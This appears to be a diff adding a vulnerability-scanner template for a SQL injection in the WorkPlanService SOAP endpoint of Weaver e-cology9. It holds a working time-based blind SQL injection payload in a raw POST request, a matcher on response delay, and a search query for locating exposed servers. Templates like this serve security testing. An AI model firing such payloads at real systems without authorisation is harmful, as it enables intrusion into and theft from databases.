@@ -1,0 +1,41 @@
+id: ecology-v9-workplanservice-sqli
+
+info:
+  name: Weaver e-cology9 WorkPlanService SQL Injection
+  author: Co5mos
+  severity: critical
+  description: |
+    泛微 e-cology9 WorkPlanService 前台存在 SQL 注入漏洞，攻击者能够利用该漏洞执行任意 SQL 语句，获取数据库敏感信息或控制数据库服务器。
+  metadata:
+    verified: true
+    fofa-query: 'app="泛微-OA（e-cology）"'
+  tags: weaver, sqli, rce
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        POST /services/WorkPlanService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
+            <soapenv:Header />
+            <soapenv:Body>
+                <web:deleteWorkPlan>
+                    <!--type: string-->
+                    <web:in0>
+                        (SELECT 8544 FROM (SELECT (SLEEP(5-(IF(27=27,0,5)))))NZeo)
+                    </web:in0>
+                    <!--type: int-->
+                    <web:in1>
+                        22
+                    </web:in1>
+                </web:deleteWorkPlan>
+            </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
